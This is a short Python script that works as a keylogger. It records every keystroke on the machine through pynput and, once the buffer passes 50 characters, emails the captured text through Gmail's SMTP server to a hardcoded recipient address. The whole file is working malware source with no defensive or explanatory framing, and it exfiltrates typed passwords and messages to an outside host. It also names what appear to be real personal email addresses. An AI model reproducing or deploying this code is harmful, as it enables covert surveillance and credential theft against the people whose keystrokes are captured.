import smtplib, getpass
from pynput.keyboard import Key, Listener
import ssl


sender = "sidrali931@gmail.com"
receiver_mail = "uzmarehman823@gmail.com"
password = getpass.getpass(prompt= "Password: ", stream = None)
context = ssl.create_default_context()
server = smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context)
server.login(sender, password)


message = ''
sent_message = ""
limit = 50

def on_press(key):
    global message
    global sent_message
    global limit
    global server
    if key == Key.space or key == Key.tab:
        message += " "

    elif key == Key.enter :
        message += "\n"
        sent_message = message
        if len(sent_message) >= limit:
            send_sms()
            sent_message = ""
    elif key == Key.shift_r or key == Key.shift_l:
        return
    elif key == Key.backspace:
        message = message[:-1]
    else:
        char = f'{key}'
        char = char[1: -1]
        message += char
    if key == Key.esc:
        return False

def send_sms():
    server.sendmail(sender, receiver_mail, sent_message)

with Listener(on_press = on_press) as listener:
    listener.join()